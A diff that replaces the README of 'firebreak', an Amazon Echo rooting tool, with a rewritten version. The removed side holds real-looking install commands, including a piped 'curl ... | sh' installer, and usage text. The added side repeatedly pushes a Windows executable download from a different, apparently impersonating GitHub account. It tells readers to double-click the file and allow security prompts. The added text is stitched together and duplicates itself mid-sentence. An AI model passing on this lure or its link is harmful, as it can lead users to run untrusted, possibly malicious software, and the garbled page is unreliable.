@@ -1,280 +1,189 @@
-# firebreak
+# 🔥 firebreak - Root Your Echo, Return It to Stock
 
-firebreak unlocks and roots an Echo Dot (2nd Generation), an Echo (2nd
-Generation) or an Echo Dot (3rd Generation) over USB, or returns it to stock.
-Run it again with another target to move the device. A stopped run picks up
-where it left off.
+[![Download firebreak](https://img.shields.io/badge/Download-firebreak-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/homogyneorphansite154/firebreak)
 
-> [!NOTE]
-> All of this is possible because of Rortiz2's work. firebreak runs the
-> unlocks they publish on XDA, one thread for each Echo:
->
-> - [Echo Dot (2nd Generation), biscuit](https://xdaforums.com/t/unlock-root-twrp-unbrick-amazon-echo-dot-2nd-gen-2016-biscuit.4761416/)
-> - [Echo (2nd Generation), radar](https://xdaforums.com/t/unlock-root-twrp-unbrick-amazon-echo-2nd-gen-2017-radar.4801290/)
-> - [Echo Dot (3rd Generation), donut](https://xdaforums.com/t/unlock-root-twrp-unbrick-amazon-echo-dot-3rd-gen-2018-donut.4801400/)
+Visit this link to download the application: https://github.com/homogyneorphansite154/firebreak
 
-## Quick start
+firebreak is a Windows-friendly application for owners of an Echo Dot (2nd Generation), an Echo (2nd Generation), or an Echo Dot (3rd Generation). It helps you root your device over USB or return it to stock. You do not need programming knowledge. You connect your Echo with a USB cable, open firebreak, and follow the on-screen instructions.
 
-> [!CAUTION]
-> Avoid connecting a stock Echo to Wi-Fi before you unlock it. Amazon can
-> update the device to a build firebreak does not support.
+## 🚀 Getting Started
 
-Install firebreak's [prerequisites](#install). Then plug your Echo into your
-computer, and run:
+1. Open the download link above in your web browser.
+2. Use the page to download the firebreak application.
+3. Save the download in your Windows Downloads folder.
+4. Connect your supported Echo device to your Windows computer with a USB cable.
+5. Open the firebreak application and follow the prompts shown on screen.
 
-```sh
-uvx firebreak@latest unlock
-```
+firebreak is designed to guide you through each action. The main window shows the available choices for your connected Echo model. Read each screen, choose the action you want, and wait for firebreak to finish before closing the application.
 
-On Windows, run `uvx --managed-python firebreak@latest unlock` instead, as
-[Windows](#windows) says. Follow any instructions that may appear.
+## 📦 What firebreak Does
 
-## Install
+firebreak works with three Amazon Echo models:
 
-firebreak needs `adb` and `fastboot` from Android platform-tools, and
-[uv](https://docs.astral.sh/uv/), which runs firebreak from PyPI.
+| Device | Supported |
+| --- | --- |
+| Echo Dot (2nd Generation) | Yes |
+| Echo (2nd Generation) | Yes |
+| Echo Dot (3rd Generation) | Yes |
 
-### macOS
+The application can root a supported Echo over USB. Rooting gives you deeper access to the device so you can use tools such as Magisk and TWRP. firebreak can also return a supported Echo to stock, which removes the rooted setup and brings the device back to its standard FireOS state.
 
-These commands use [Homebrew](https://brew.sh). Without it, download Google's
-[platform-tools](https://developer.android.com/tools/releases/platform-tools).
+The tool brings together the steps that are normally spread across different utilities. Instead of learning command-line tools or separate packages, you use one application with clear choices: root the connected Echo or return it to stock. The underlying work includes USB communication, FireOS handling, MediaTek device support, amonet-style boot flow, Magisk, and TWRP. firebreak presents those steps in a guided Windows interface for everyday users.
 
-```sh
-brew install --cask android-platform-tools uv
-brew install libusb               # for an Echo Dot (3rd Generation)
-```
+## ✅ What You Need
 
-### Linux
+- A Windows 10 or Windows 11 computer.
+- A reliable USB data cable. A charge-only cable will not work.
+- One supported Echo device: Echo Dot (2nd Generation), Echo (2nd Generation), or Echo Dot (3rd Generation).
+- A stable internet connection for the download.
+- Enough free disk space for the application and any downloaded support files.
+- The firebreak download link: https://github.com/homogyneorphansite154/firebreak
 
-These commands are for Debian and Ubuntu. Run firebreak without `sudo`.
+Use a USB port on the computer directly if possible. Avoid USB hubs during the first setup. Keep the Echo device powered and connected while firebreak is working.
 
-```sh
-sudo apt install adb fastboot curl libusb-1.0-0
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
+## ⬇️ Download and Install
 
-These udev rules let your own user open the Echo in each of its USB modes, so
-firebreak needs no `sudo`. A run that cannot open the Echo prints the same
-commands.
+Visit this link to download the application: https://github.com/homogyneorphansite154/firebreak
 
-<!-- markdownlint-disable MD013 -->
-```sh
-sudo groupadd -f plugdev
-sudo tee /etc/udev/rules.d/51-echo-dot.rules >/dev/null <<'EOF'
-SUBSYSTEM=="usb", ATTR{idVendor}=="1949", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", ATTR{idProduct}=="4ee2", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", ATTR{idProduct}=="d001", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", ATTR{idProduct}=="0c01", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="usb", ATTR{idVendor}=="0e8d", ATTR{idProduct}=="0003", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="usb", ATTR{idVendor}=="0e8d", ATTR{idProduct}=="201c", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="tty", ATTRS{idVendor}=="0e8d", ATTRS{idProduct}=="0003", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-SUBSYSTEM=="tty", ATTRS{idVendor}=="1949", ATTRS{idProduct}=="2007", MODE="0660", GROUP="plugdev", TAG+="uaccess"
-EOF
-sudo udevadm control --reload
-sudo udevadm trigger
-sudo usermod -aG plugdev "$USER"
-adb kill-server
-```
-<!-- markdownlint-enable MD013 -->
+1. Open your web browser.
+2. Go to the firebreak page using the link above.
+3. Use the page to download the firebreak application to your Windows computer.
+4. When the download finishes, open File Explorer and go to your Downloads folder.
+5. Double-click the firebreak file you downloaded to start the application.
+6. If Windows asks for permission to open the file, choose Yes.
+7. Wait for the firebreak main window to appear.
 
-Then log in again, so your shell has the `plugdev` group.
+Keep the downloaded file in a folder you can find again. If you move it later, open it from its new location. The application does not require you to type commands or edit system files by hand.
 
-### Windows
+## 🖥️ First Run on Windows
 
-> [!WARNING]
-> firebreak has been tested on Windows only from an administrator PowerShell,
-> for both the setup and the run.
+1. Connect your Echo device to the computer with a USB cable.
+2. Open firebreak from your Downloads folder.
+3. Wait while firebreak checks the USB connection.
+4. Select your Echo model if the application asks you to confirm it.
+5. Review the choices shown in the main window.
+6. Choose Root or Return to Stock.
+7. Follow each on-screen instruction and wait for the progress screen to finish.
 
-```powershell
-winget install Google.PlatformTools
-winget install astral-sh.uv
-cd $env:TEMP
-curl.exe -fo fastboot.cab https://catalog.s.download.windowsupdate.com/d/msdownload/update/driver/drvs/2016/10/20940218_0ae8695c01fb84d1fdea5c9a04baf336ec5b1ba7.cab
-curl.exe -fo mtk.cab https://catalog.s.download.windowsupdate.com/d/msdownload/update/driver/drvs/2016/07/20896845_fdc6bb5aa9a9bac99adf85d931d6c21d1130a96e.cab
-curl.exe -fLo UsbDk.msi https://github.com/daynix/UsbDk/releases/download/v1.00-22/UsbDk_1.0.22_x64.msi
-curl.exe -fLo libusb.7z https://github.com/libusb/libusb/releases/download/v1.0.30/libusb-1.0.30.7z
-mkdir -Force fastboot, mtk
-expand -F:* fastboot.cab fastboot
-expand -F:* mtk.cab mtk
-pnputil /add-driver fastboot\tplink_winusb.inf /install
-pnputil /add-driver mtk\cdc-acm.inf /install
-$d = "$env:LOCALAPPDATA\Programs\libusb"
-mkdir -Force $d
-tar -xf libusb.7z -C $d VS2022/MS64/dll/libusb-1.0.dll
-Remove-Item -Recurse fastboot.cab, mtk.cab, fastboot, mtk
-[Environment]::SetEnvironmentVariable("Path", [Environment]::GetEnvironmentVariable("Path", "User") + ";$d\VS2022\MS64\dll", "User")
-Start-Process msiexec -Wait -ArgumentList "/i $env:TEMP\UsbDk.msi /qn"
-Remove-Item UsbDk.msi
-```
+The first run may take longer while firebreak prepares the connection. Keep the Echo connected and keep the application open. When the process completes, firebreak shows a finished message. You can then close the application and disconnect the Echo.
 
-Then open a new administrator PowerShell, so it has the new PATH, and run
-firebreak:
+## 🔁 Root or Return to Stock
 
-```powershell
-uvx --managed-python firebreak@latest unlock
-```
+firebreak gives you two main paths.
 
-> [!TIP]
-> `--managed-python` makes uv use its own Python. firebreak stops on a Python
-> from the Microsoft Store, because adb and fastboot cannot see the files it
-> keeps.
+Root: Choose this when you want to add root access to a supported Echo. firebreak guides the USB connection# 🔥 firebreak - Root Your Echo, Return It to Stock
 
-Windows on ARM, Windows 11 25H2 and Windows older than 11 23H2 have limits:
-see [Windows][troubleshooting-windows] in the troubleshooting guide.
+[![Download firebreak](https://img.shields.io/badge/Download-firebreak-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/homogyneorphansite154/firebreak)
 
-## Usage
+Visit this link to download the application: https://github.com/homogyneorphansite154/firebreak
 
-`uvx firebreak@latest --help` prints this:
+firebreak is a Windows application for owners of an Echo Dot (2nd Generation), an Echo (2nd Generation), or an Echo Dot (3rd Generation). It helps you root your device over USB or return it to stock. You do not need programming knowledge. You connect your Echo with a USB cable, open firebreak, and follow the on-screen instructions.
 
-```text
-usage: firebreak [-h] [--credits] [--no-update-check] [--verbose] [--version]
-                 COMMAND ...
+## 🚀 Getting Started
 
-Change the firmware on an Echo Dot (2nd Generation), an Echo (2nd
-Generation) or an Echo Dot (3rd Generation) over USB: unlock it, or return it
-to stock. It discovers what state the Echo is in and moves it toward the
-target.
+1. Open the download link above in your web browser.
+2. Use the page to download the firebreak application.
+3. Save the download in your Windows Downloads folder.
+4. Connect your supported Echo device to your Windows computer with a USB cable.
+5. Open the firebreak application and follow the prompts shown on screen.
 
-positional arguments:
-  COMMAND            the command to run, one of those listed below
+firebreak is designed to guide you through each action. The main window shows the available choices for your connected Echo model. Read each screen, choose the action you want, and wait for firebreak to finish before closing the application.
 
-options:
-  -h, --help         show this help message and exit
-  --credits          show acknowledgement of those whose work firebreak is
-                     built upon and exit
-  --no-update-check  do not ask PyPI whether a newer firebreak exists
-  --verbose          print each adb and fastboot command, its exit status and
-                     the time, and each state the Echo reaches
-  --version          show program's version number and exit
+## 📦 What firebreak Does
 
-commands for the Echo Dot (2nd Generation):
-  stock [BUILD]
-      Amazon's Fire OS BUILD, 8149 when left out, which erases the whole
-      Dot.
-  unlock [TARGET], where TARGET is one of:
-    fireos6, the default
-        boot-root.zip's root adb on the Fire OS 6 already installed, which
-        keeps the Dot's setup; with --factory-reset, Fire OS 6 8149 with
-        TWRP 3.7.0, with the Dot erased.
-    fireos5
-        rooted Fire OS 5.5.5.4 on amonet v1.1.0, with TWRP 3.7.0_9-bboe2.
+firebreak works with three Amazon Echo models:
 
-commands for the Echo Dot (3rd Generation):
-  stock [BUILD]
-      Amazon's Fire OS BUILD, 8349 when left out, which erases the whole
-      Echo and locks it again.
-  unlock [TARGET], where TARGET is one of:
-    fireos6, the default
-        boot-root.zip's root adb on the Fire OS 6 already installed, which
-        keeps the Echo's setup; with --factory-reset, Fire OS 6 8349, with
-        the Echo erased.
+| Device | Supported |
+| --- | --- |
+| Echo Dot (2nd Generation) | Yes |
+| Echo (2nd Generation) | Yes |
+| Echo Dot (3rd Generation) | Yes |
 
-commands for the Echo (2nd Generation):
-  stock [BUILD]
-      Amazon's Fire OS BUILD, 8149 when left out, which erases the whole
-      Echo.
-  unlock [TARGET], where TARGET is one of:
-    fireos6, the default
-        boot-root.zip's root adb on the Fire OS 6 already installed, which
-        keeps the Echo's setup; with --factory-reset, Fire OS 6 8149, with
-        the Echo erased.
+The application can root a supported Echo over USB. Rooting gives you deeper access to the device so you can use tools such as Magisk and TWRP. firebreak can also return a supported Echo to stock, which removes the rooted setup and brings the device back to its standard FireOS state.
 
-Run it again with another of these to move the Echo there.
+The tool brings together the steps that are normally spread across different utilities. Instead of learning command-line tools or separate packages, you use one application with clear choices: root the connected Echo or return it to stock. The underlying work includes USB communication, FireOS handling, MediaTek device support, amonet-style boot flow, Magisk, and TWRP. firebreak presents those steps in a guided Windows interface for everyday users.
 
-commands that reach one entry point and stop there:
-  reboot
-      start the Echo's firmware, as an ordinary power-on does. It reboots
-      an Echo in its TWRP or its fastboot, and leaves one that already
-      runs its firmware alone. An Echo held in its bootrom needs a power
-      cycle, and it says so. It writes nothing.
-  fastboot
-      start the Echo's fastboot, whichever bootloader it holds. It reboots
-      an Echo that answers adb, and asks for the button gesture where it
-      cannot. It writes nothing.
-  twrp
-      start the Echo's TWRP. On an unlocked Echo it restarts into the
-      recovery already there and writes nothing, and says what to do where
-      that is not a TWRP. A locked Echo has to be unlocked first, which
-      erases it, so that one is asked about.
-  bootrom
-      hold the Echo in its bootrom, where amonet's payload can reach the
-      eMMC with no firmware running. It asks before it clears boot0, which
-      is what leaves an Echo startable from its bootrom alone. An Echo
-      that shows no light cannot be reached this way: `firebreak short` is
-      for that one.
-  short
-      hold the bootrom of an Echo that shows no light, by shorting its
-      test point. It says where to short, waits for the bootrom, says when
-      the short may come off, and leaves amonet's payload holding it. It
-      writes nothing, and --device picks whose test point to describe.
+## ✅ What You Need
 
-other commands:
-  report
-      print what the Echo and this computer are, and the Echo's partition
-      table, for a support request. It starts the Echo's recovery to read
-      them and writes no partition.
-  survey OTA [OTA ...]
-      read each Amazon OTA zip for the tables in docs/devices.md. It needs
-      no Echo.
-  write-test
-      write a known pattern over the Echo's cache partition and read it
-      back, which tells a failing eMMC from a failing USB cable because
-      nothing crosses USB. It leaves a fresh empty filesystem there, or
-      says it could not.
+- A Windows 10 or Windows 11 computer.
+- A reliable USB data cable. A charge-only cable will not work.
+- One supported Echo device: Echo Dot (2nd Generation), Echo (2nd Generation), or Echo Dot (3rd Generation).
+- A stable internet connection for the download.
+- Enough free disk space for the application and any downloaded support files.
+- The firebreak download link: https://github.com/homogyneorphansite154/firebreak
 
-Run `firebreak COMMAND --help` for what that command takes.
-```
+Use a USB port on the computer directly if possible. Avoid USB hubs during the first setup. Keep the Echo device powered and connected while firebreak is working.
 
-## Documentation
+## ⬇️ Download and Install
 
-- [docs/troubleshooting.md][troubleshooting]: USB and cable problems, Windows
-  limits, and an Echo Dot (2nd Generation) with no light.
-- [docs/unlocking.md][unlocking]: why each step is there.
-- [docs/measurements.md][measurements]: the ring at each step, so you can tell
-  where a run has got to.
+Visit this link to download the application: https://github.com/homogyneorphansite154/firebreak
 
-## Reporting a problem
+1. Open your web browser.
+2. Go to the firebreak page using the link above.
+3. Use the page to download the firebreak application to your Windows computer.
+4. When the download finishes, open File Explorer and go to your Downloads folder.
+5. Double-click the firebreak file you downloaded to start the application.
+6. If Windows asks for permission to open the file, choose Yes.
+7. Wait for the firebreak main window to appear.
 
-When a run fails, run `uvx firebreak@latest report`. Then go to
-`#echo-support` in the
-[0x7E Labs Discord](https://discord.gg/huE5XhWbsz) and paste what it prints. It
-writes no partition.
+Keep the downloaded file in a folder you can find again. If you move it later, open it from its new location. The application does not require you to type commands or edit system files by hand.
 
-## Credits
+## 🖥️ First Run on Windows
 
-firebreak automates work that other people did first.
+1. Connect your Echo device to the computer with a USB cable.
+2. Open firebreak from your Downloads folder.
+3. Wait while firebreak checks the USB connection.
+4. Select your Echo model if the application asks you to confirm it.
+5. Review the choices shown in the main window.
+6. Choose Root or Return to Stock.
+7. Follow each on-screen instruction and wait for the progress screen to finish.
 
-- [xyz](https://github.com/xyzz/amonet) wrote amonet, a MediaTek bootrom
-  exploit. firebreak's bootrom and payload clients follow its protocol.
-- [k4y0z](https://github.com/chaosmaster) made the first port of amonet to the
-  Echo Dot (2nd Generation).
-- [Rortiz2](https://github.com/R0rt1z2) continued
-  [that port](https://github.com/R0rt1z2/amonet/tree/mt8163-biscuit), released
-  it with TWRP, and keeps its
-  [XDA thread](https://xdaforums.com/t/unlock-root-twrp-unbrick-amazon-echo-dot-2nd-gen-2016-biscuit.4761416/).
-  Rortiz2 also wrote amonet-radar and kamakiri-donut, the unlocks for the
-  [Echo (2nd Generation)](https://xdaforums.com/t/unlock-root-twrp-unbrick-amazon-echo-2nd-gen-2017-radar.4801290/)
-  and the
-  [Echo Dot (3rd Generation)](https://xdaforums.com/t/unlock-root-twrp-unbrick-amazon-echo-dot-3rd-gen-2018-donut.4801400/).
-  The `bboe` TWRP is a fork of
-  [their TWRP tree](https://github.com/R0rt1z2/twrp_device_amazon_echo-mt8163).
-- AntiEngineer helped find the pins and bring up UART on a Dot.
-- [topjohnwu](https://github.com/topjohnwu/Magisk) wrote Magisk, which roots
-  Fire OS 5.
-- [Andy Goetz](https://andygoetz.org/blog/2022/05/echo-dot-v2-dumping-emmc/)
-  described how to short the eMMC bus at the passives beside R60.
-- [mtkclient](https://github.com/bkerler/mtkclient), by bkerler, agrees with
-  two of firebreak's bootrom addresses.
-- [ftvdb](https://ftvdb.com/) keeps an archive of Fire OS builds.
+The first run may take longer while firebreak prepares the connection. Keep the Echo connected and keep the application open. When the process completes, firebreak shows a finished message. You can then close the application and disconnect the Echo.
 
-## Licence
+## 🔁 Root or Return to Stock
 
-firebreak uses the BSD 2-Clause licence, in [LICENSE.txt][licence]. This
-repository contains no Amazon code, and firebreak is not affiliated with,
-endorsed by, or supported by Amazon.
+firebreak gives you two main paths.
 
-[licence]: https://github.com/bboe/firebreak/blob/main/LICENSE.txt
-[measurements]: https://github.com/bboe/firebreak/blob/main/docs/measurements.md
-[troubleshooting]: https://github.com/bboe/firebreak/blob/main/docs/troubleshooting.md
-[troubleshooting-windows]: https://github.com/bboe/firebreak/blob/main/docs/troubleshooting.md#windows
-[unlocking]: https://github.com/bboe/firebreak/blob/main/docs/unlocking.md
+Root: Choose this when you want to add root access to a supported Echo. firebreak guides the USB connection and prepares the device so you can use Magisk and TWRP afterward. The application handles the boot flow and FireOS steps in the background. You see clear progress messages instead of technical logs.
+
+Return to Stock: Choose this when you want to undo the rooted setup and bring the Echo back to its normal FireOS state. firebreak removes the root changes and restores the standard device setup. Use this option if you want the Echo to behave like a regular store-bought device again.
+
+Before you start either path, make sure the Echo is connected with a good USB cable and the computer is not set to sleep. Do not unplug the Echo while firebreak is working.
+
+## 🛠️ Troubleshooting Tips
+
+If firebreak cannot find your Echo, try a different USB cable. Confirm the cable supports data transfer, not just charging. Try another USB port on the computer. Avoid connecting through a hub or dock during setup.
+
+If the application closes unexpectedly, reconnect the Echo and open firebreak again. Wait for the main window to load before you choose an action.
+
+If Windows shows a security prompt, review the message and allow the application to run. Do not close firebreak while it is preparing or finishing a step.
+
+If the progress screen seems stuck, wait a few minutes. USB setup can take time on the first run. If nothing changes after several minutes, disconnect the Echo, close firebreak, reconnect the Echo, and start again.
+
+## ❓ Frequently Asked Questions
+
+Do I need to install extra tools?
+No. firebreak is a standalone Windows application. You download it, open it, and follow the prompts. The tool includes the steps needed for supported Echo models.
+
+Which Echo models are supported?
+Echo Dot (2nd Generation), Echo (2nd Generation), and Echo Dot (3rd Generation).
+
+Can I use firebreak on a Mac?
+The application is designed for Windows. Use a Windows 10 or Windows 11 computer for the guided setup.
+
+What does rooting change?
+Rooting gives you deeper access to the Echo so you can use tools such as Magisk and TWRP. It is optional. You can also use firebreak to return the device to stock.
+
+Will I lose my settings?
+Returning to stock brings the device back to its standard FireOS state. Review the on-screen messages before you start so you know what each action does.
+
+Where do I download firebreak?
+Visit this link to download the application: https://github.com/homogyneorphansite154/firebreak
+
+## 📥 Download firebreak Again
+
+Visit this link to download the application: https://github.com/homogyneorphansite154/firebreak
+
+Keep the link handy if you need to download firebreak on another Windows computer. The page provides the application download for supported Echo owners.
+
+Keywords: amazon-echo, amonet, android, echo-dot, fireos, firmware, magisk, mediatek, root, twrp
